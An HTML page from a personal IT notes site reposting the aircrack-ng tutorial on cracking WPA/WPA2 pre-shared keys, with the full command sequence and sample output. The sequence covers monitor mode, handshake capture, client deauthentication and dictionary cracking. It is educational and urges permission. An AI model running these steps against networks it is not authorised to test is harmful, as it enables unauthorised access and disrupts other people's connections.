<!DOCTYPE html>
<html class="html" lang="">
  <head>
    <meta charset="utf-8">
    <title>Tutorial: How to Crack WPA/WPA2 · </title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <meta name="author" content=" Maurizio Proietti ">

    
    <meta property="og:title" content="Tutorial: How to Crack WPA/WPA2" />
    <meta property="og:type" content="" />
    <meta property="og:url" content="" />
    <meta property="og:image" content="" />
    <meta property="og:site_name" content="" />
    <meta property="og:description" content="" />

    <link rel="manifest" href="/manifest.json">

    <meta name="theme-color" content="#fff" />


    <meta name="msapplicati on-TileColor" content="#ffffff">

    <link rel="canonical" href=/>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">


    

    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4RE3324MGY"></script>
    <script src="https://kit.fontawesome.com/2845a43a9e.js" crossorigin="anonymous"></script>
    
	<script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-4RE3324MGY');
    </script>

  </head>
  
<body id="app-layout">

	
	  
<nav class="navbar navbar-expand-lg navbar-light bg-light">
  <a class="navbar-brand" href="/">
	  <img src='/icons/gremapro.svg' alt="GreMaPro" width="70" height="70" alt="GreMaPro">
      
  </a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarSupportedContent">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item active">
        <a class="nav-link" href="/">GreM@Pro - IT & Passion <span class="sr-only">(current)</span></a>
      </li>

    </ul>
    <ul class="navbar-nav mr-sm-2">
<li class="nav-item">
		<a class="nav-link" href="/posts">Appunti</a>
	</li>
      <li class="nav-item">
        
        <a class="nav-link" href="https://www.maurizio.proietti.name/">Blog</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="/portfolio">Portfolio</a>
      </li>

      <li class="nav-item">
        <a class="nav-link" href="https://link.proietti.net/@maox">About</a>
      </li>

    </ul>
  </div>
</nav>


<div class="container">
  <H1> Tutorial: How to Crack WPA/WPA2 </H1>
    <main>
      <p>Tutorial: How to Crack WPA/WPA2</p>
<p>fonte: <a href="http://www.aircrack-ng.org/doku.php?id=cracking_wpa">http://www.aircrack-ng.org/doku.php?id=cracking_wpa</a></p>
<p>Version: 1.05 May 16, 2007<br />By: darkAudax<br />Introduction</p>
<p>This tutorial walks you through cracking WPA/WPA2 networks which use <br />pre-shared keys. I recommend you do some background reading to better <br />understand what WPA/WPA2 is. The Wiki links page has a WPA/WPA2 section.</p>
<p>WPA/WPA2 supports many types of authentication beyond pre-shared keys. <br />aircrack-ng can ONLY crack pre-shared keys. So make sure airodump-ng <br />shows the network as having the authentication type of PSK, otherwise, <br />don&#39;t bother trying to crack it.</p>
<p>There is another important difference between cracking WPA/WPA2 and WEP. <br />This is the approach used to crack the WPA/WPA2 pre-shared key. Unlike <br />WEP, where statistical methods can be used to speed up the cracking <br />process, only plain brute force techniques can be used against WPA/WPA2. <br />That is, because the key is not static, so collecting IVs like when <br />cracking WEP encryption, does not speed up the attack. The only thing <br />that does give the information to start an attack is the handshake <br />between client and AP. Handshaking is done when the client connects to <br />the network. Although not absolutely true, for the purposes of this <br />tutorial, consider it true. Since the pre-shared key can be from 8 to 63 <br />characters in length, it effectively becomes impossible to crack the <br />pre-shared key.</p>
<p>The only time you can crack the pre-shared key is if it is a dictionary <br />word or relatively short in length. Conversely, if you want to have an <br />unbreakable wireless network at home, use WPA/WPA2 and a 63 character <br />password composed of random characters including special symbols.</p>
<p>The impact of having to use a brute force approach is substantial. <br />Because it is very compute intensive, a computer can only test 50 to 300 <br />possible keys per second depending on the computer CPU. It can take <br />hours, if not days, to crunch through a large dictionary. If you are <br />thinking about generating your own password list to cover all the <br />permutations and combinations of characters and special symbols, check <br />out this brute force time calculator first. You will be very surprised <br />at how much time is required.</p>
<p>There is no difference between cracking WPA or WPA2 networks. The <br />authentication methodology is basically the same between them. So the <br />techniques you use are identical.</p>
<p>It is recommended that you experiment with your home wireless access <br />point to get familiar with these ideas and techniques. If you do not own <br />a particular access point, please remember to get permission from the <br />owner prior to playing with it.</p>
<p>I would like to acknowledge and thank the Aircrack-ng team for producing <br />such a great robust tool.</p>
<p>Please send me any constructive feedback, positive or negative. <br />Additional troubleshooting ideas and tips are especially welcome.<br />Assumptions</p>
<p>First, this solution assumes:</p>
<p>     *<br />       You are using drivers patched for injection. Use the injection <br />test to confirm your card can inject.<br />     *<br />       You are physically close enough to send and receive access point <br />and wireless client packets. Remember that just because you can receive <br />packets from them does not mean you may will be able to transmit packets <br />to them. The wireless card strength is typically less then the AP <br />strength. So you have to be physically close enough for your transmitted <br />packets to reach and be received by both the AP and the wireless client. <br />You can confirm that you can communicate with the specific AP by <br />following these instructions.<br />     *<br />       You are using v0.9 of aircrack-ng. If you use a different version <br />then some of the command options may have to be changed.</p>
<p>Ensure all of the above assumptions are true, otherwise the advice that <br />follows will not work. In the examples below, you will need to change <br />&quot;ath0&quot; to the interface name which is specific to your wireless card.</p>
<p>In the examples, the option &quot;double dash bssid&quot; is shown as &quot;- -bssid&quot;. <br />Remember to remove the space between the two dashes when using it in <br />real life. This also applies to &quot;- -ivs&quot;, &quot;- -arpreplay&quot;, &quot;- -deauth&quot;, <br />&quot;- -channel&quot;, &quot;- -arp&quot; and &quot;- -fakeauth&quot;.<br />Equipment used</p>
<p>To follow this tutorial at home, you must have two wireless cards.</p>
<p>In this tutorial, here is what was used:</p>
<p>     *<br />       MAC address of PC running aircrack-ng suite: 00:0F:B5:88:AC:82<br />     *<br />       MAC address of the wireless client using WPA2: 00:0F:B5:FD:FB:C2<br />     *<br />       BSSID (MAC address of access point): 00:14:6C:7E:40:80<br />     *<br />       ESSID (Wireless network name): teddy<br />     *<br />       Access point channel: 9<br />     *<br />       Wireless interface: ath0</p>
<p>You should gather the equivalent information for the network you will be <br />working on. Then just change the values in the examples below to the <br />specific network.<br />Solution<br />Solution Overview</p>
<p>The objective is to capture the WPA/WPA2 authentication handshake and <br />then use aircrack-ng to crack the pre-shared key.</p>
<p>This can be done either actively or passively. &quot;Actively&quot; means you will <br />accelerate the process by deauthenticating an existing wireless client. <br />&quot;Passively&quot; means you simply wait for a wireless client to authenticate <br />to the WPA/WPA2 network. The advantage of passive is that you don&#39;t <br />actually need injection capability and thus the Windows version of <br />aircrack-ng can be used.</p>
<p>Here are the basic steps we will be going through:</p>
<p>    1.<br />       Start the wireless interface in monitor mode on the specific AP <br />channel<br />    2.<br />       Start airodump-ng on AP channel with filter for bssid to collect <br />authentication handshake<br />    3.<br />       Use aireplay-ng to deauthenticate the wireless client<br />    4.<br />       Run aircrack-ng to crack the pre-shared key using the <br />authentication handshake</p>
<p>Step 1 &#8211; Start the wireless interface in monitor mode</p>
<p>The purpose of this step is to put your card into what is called monitor <br />mode. Monitor mode is the mode whereby your card can listen to every <br />packet in the air. Normally your card will only &quot;hear&quot; packets addressed <br />to you. By hearing every packet, we can later capture the WPA/WPA2 4-way <br />handshake. As well, it will allow us to optionally deauthenticate a <br />wireless client in a later step.</p>
<p>First stop ath0 by entering:</p>
<p>  airmon-ng stop ath0</p>
<p>The system responds:</p>
<p>  Interface       Chipset         Driver</p>
<p>  wifi0           Atheros         madwifi-ng<br />  ath0            Atheros         madwifi-ng VAP (parent: wifi0) (VAP <br />destroyed)</p>
<p>Enter &quot;iwconfig&quot; to ensure there are no other athX interfaces. It should <br />look similar to this:</p>
<p>  lo        no wireless extensions.</p>
<p>  eth0      no wireless extensions.</p>
<p>  wifi0     no wireless extensions.</p>
<p>If there are any remaining athX interfaces, then stop each one. When you <br />are finished, run &quot;iwconfig&quot; to ensure there are none left.</p>
<p>Now, enter the following command to start the wireless card on channel 9 <br />in monitor mode:</p>
<p>  airmon-ng start wifi0 9</p>
<p>Note: In this command we use &quot;wifi0&quot; instead of our wireless interface <br />of &quot;ath0&quot;. This is because the madwifi-ng drivers are being used.</p>
<p>The system will respond:</p>
<p>  Interface       Chipset         Driver</p>
<p>  wifi0           Atheros         madwifi-ng<br />  ath0            Atheros         madwifi-ng VAP (parent: wifi0) <br />(monitor mode enabled)</p>
<p>You will notice that &quot;ath0&quot; is reported above as being put into monitor <br />mode.</p>
<p>To confirm the interface is properly setup, enter &quot;iwconfig&quot;.</p>
<p>The system will respond:</p>
<p>  lo        no wireless extensions.</p>
<p>  wifi0     no wireless extensions.</p>
<p>  eth0      no wireless extensions.</p>
<p>  ath0      IEEE 802.11g  ESSID:&quot;&quot;  Nickname:&quot;&quot;<br />         Mode:Monitor  Frequency:2.452 GHz  Access Point: <br />00:0F:B5:88:AC:82<br />         Bit Rate:0 kb/s   Tx-Power:18 dBm   Sensitivity=0/3<br />         Retry:off   RTS thr:off   Fragment thr:off<br />         Encryption key:off<br />         Power Management:off<br />         Link Quality=0/94  Signal level=-95 dBm  Noise level=-95 dBm<br />         Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0<br />         Tx excessive retries:0  Invalid misc:0   Missed beacon:0</p>
<p>In the response above, you can see that ath0 is in monitor mode, on the <br />2.452GHz frequency which is channel 9 and the Access Point shows the MAC <br />address of your wireless card. Only the madwifi-ng drivers show the card <br />MAC address in the AP field, other drivers do not. So everything is <br />good. It is important to confirm all this information prior to <br />proceeding, otherwise the following steps will not work properly.</p>
<p>To match the frequency to the channel, check out:</p>
<p><a href="http://www.rflinx.com/help/calculations/#2.4ghz_wifi_channels">http://www.rflinx.com/help/calculations/#2.4ghz_wifi_channels</a> then <br />select the &quot;Wifi Channel Selection and Channel Overlap&quot; tab. This will <br />give you the frequency for each channel.<br />Step 2 &#8211; Start airodump-ng to collect authentication handshake</p>
<p>The purpose of this step is run airodump-ng to capture the 4-way <br />authentication handshake for the AP we are interested in.</p>
<p>Enter:</p>
<p>  airodump-ng -c 9 &#8211; -bssid 00:14:6C:7E:40:80 -w psk ath0</p>
<p>Where:</p>
<p>     *<br />       -c 9 is the channel for the wireless network<br />     *<br />       &#8211; -bssid 00:14:6C:7E:40:80 is the access point MAC address. This <br />eliminate extraneous traffic.<br />     *<br />       -w psk is the file name prefix for the file which will contain <br />the IVs.<br />     *<br />       ath0 is the interface name.</p>
<p>Important: Do NOT use the &quot;- -ivs&quot; option. You must capture the full <br />packets.</p>
<p>Here what it looks like if a wireless client is connected to the network:</p>
<p>   CH  9 ][ Elapsed: 4 s ][ 2007-03-24 16:58 </p>
<p>   BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC <br />CIPHER AUTH ESSID </p>
<p>   00:14:6C:7E:40:80   39 100       51      116   14   9  54  WPA2 CCMP <br />   PSK  teddy </p>
<p>   BSSID              STATION            PWR  Lost  Packets  Probes </p>
<p><p>   00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35     0      116</p>
<p>Here it is with no connected wireless clients:</p>
<p>   CH  9 ][ Elapsed: 4 s ][ 2007-03-24 17:51 </p>
<p>   BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC <br />CIPHER AUTH ESSID </p>
<p>   00:14:6C:7E:40:80   39 100       51        0    0   9  54  WPA2 CCMP <br />   PSK  teddy </p>
<p>   BSSID              STATION            PWR  Lost  Packets  Probes </p>
<p>Step 3 &#8211; Use aireplay-ng to deauthenticate the wireless client</p>
<p>This step is optional. You only perform this step if you opted to <br />actively speed up the process. The other constraint is that there must <br />be a wireless client currently associated with the AP. If there is no <br />wireless client currently associated with the AP, then move onto the <br />next step and be patient. Needless to say, if a wireless client shows up <br />later, you can backtrack and perform this step.</p>
<p>What this step does is send a message to the wireless client saying that <br />that it is no longer associated with the AP. The wireless client will <br />then hopefully reauthenticate with the AP. The reauthentication is what <br />generates the 4-way authentication handshake we are interested in <br />collecting. This what we use to break the WPA/WPA2 pre-shared key.</p>
<p>Based on the output of airodump-ng in the previous step, you determine a <br />client which is currently connected. You need the MAC address for the <br />following. Open another console session and enter:</p>
<p>  aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0</p>
<p>Where:</p>
<p>     *<br />       -0 means deauthentication<br />     *<br />       1 is the number of deauths to send (you can send muliple if you wish)<br />     *<br />       -a 00:14:6C:7E:40:80 is the MAC address of the access point<br />     *<br />       -c 00:0F:B5:FD:FB:C2 is the MAC address of the client you are <br />deauthing<br />     *<br />       ath0 is the interface name</p>
<p>Here is what the output looks like:</p>
<p>  11:09:28  Sending DeAuth to station   &#8212; STMAC: [00:0F:B5:34:30:30]</p>
<p>With luck this causes the client to reauthenticate and yield the 4-way <br />handshake.<br />Troubleshooting Tips</p>
<p>     *<br />       The deauthentication packets are sent directly from your PC to <br />the clients. So you must be physically close enough to the clients for <br />your wireless card transmissions to reach them.</p>
<p>Step 4 &#8211; Run aircrack-ng to crack the pre-shared key</p>
<p>The purpose of this step is to actually crack the WPA/WPA2 pre-shared <br />key. To do this, you need a dictionary of words as input. Basically, <br />aircrack-ng takes each word and tests to see if this is in fact the <br />pre-shared key.</p>
<p>There is a small dictionary that comes with aircrack-ng &#8211; <br />&quot;password.lst&quot;. The Wiki FAQ has an extensive list of dictionary <br />sources. You can use John the Ripper (JTR) to generate your own list and <br />pipe them into aircrack-ng. Using JTR in conjunction with aircrack-ng is <br />beyond the scope of this tutorial.</p>
<p>Open another console session and enter:</p>
<p>aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap</p>
<p>Where:</p>
<p>     *<br />       -w password.lst is the name of the dictionary file. Remember to <br />specify the full path if the file is not located in the same directory.<br />     *<br />       *.cap is name of group of files containing the captured packets. <br />Notice in this case that we used the wildcard * to include multiple files.</p>
<p>Here is typical output when there are no handshakes found:</p>
<p>  Opening psk-01.cap<br />  Opening psk-02.cap<br />  Opening psk-03.cap<br />  Opening psk-04.cap<br />  Read 1827 packets.</p>
<p>  No valid WPA handshakes found.</p>
<p>When this happens you either have to redo step 3 (deauthenticating the <br />wireless client) or wait longer if you are using the passive approach. <br />When using the passive approach, you have to wait until a wireless <br />client authenticates to the AP.</p>
<p>Here is typical output when handshakes are found:</p>
<p>  Opening psk-01.cap<br />  Opening psk-02.cap<br />  Opening psk-03.cap<br />  Opening psk-04.cap<br />  Read 1827 packets.</p>
<p>  #  BSSID              ESSID                     Encryption</p>
<p>  1  00:14:6C:7E:40:80  teddy                     WPA (1 handshake)</p>
<p>  Choosing first network as target.</p>
<p>Now at this point, aircrack-ng will start attempting to crack the <br />pre-shared key. Depending on the speed of your CPU and the size of the <br />dictionary, this could take a long time, even days.</p>
<p>Here is what successfully cracking the pre-shared key looks like:</p>
<p>                                Aircrack-ng 0.8</p>
<p>                  [00:00:00] 2 keys tested (37.20 k/s)</p>
<p>                          KEY FOUND! [ 12345678 ]</p>
<p>     Master Key     : CD 69 0D 11 8E AC AA C5 C5 EC BB 59 85 7D 49 3E<br />                      B8 A6 13 C5 4A 72 82 38 ED C3 7E 2C 59 5E AB FD</p>
<p>     Transcient Key : 06 F8 BB F3 B1 55 AE EE 1F 66 AE 51 1F F8 12 98<br />                      CE 8A 9D A0 FC ED A6 DE 70 84 BA 90 83 7E CD 40<br />                      FF 1D 41 E1 65 17 93 0E 64 32 BF 25 50 D5 4A 5E<br />                      2B 20 90 8C EA 32 15 A6 26 62 93 27 66 66 E0 71</p>
<p>     EAPOL HMAC     : 4E 27 D9 5B 00 91 53 57 88 9C 66 C8 B1 29 D1 CB</p>
<p>
<p>&#8212;<br />principio di Napoleone:<br />non attribuire a malintenzione cio&#39; che puo&#39;<br />essere semplicemente spiegato come imbecillita&#39;<br />&#8212;<br />MaoX Blog:<br /><a href="http://maox.blogspot.com">http://maox.blogspot.com</a></p>

    </main>

</div>

<div class="row">
.
</div>

<footer class="bg-light text-center text-lg-start">
  <!-- Copyright -->
  <div class="text-center p-3" style="background-color: rgba(0, 0, 0, 0.2)">
    © 2020 Copyright:
    <a class="text-dark" href="https://github.com/MaoX17/eleventy-bootstrap">  </a>
  </div>
  <!-- Copyright -->
</footer>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
  </body>
</html>



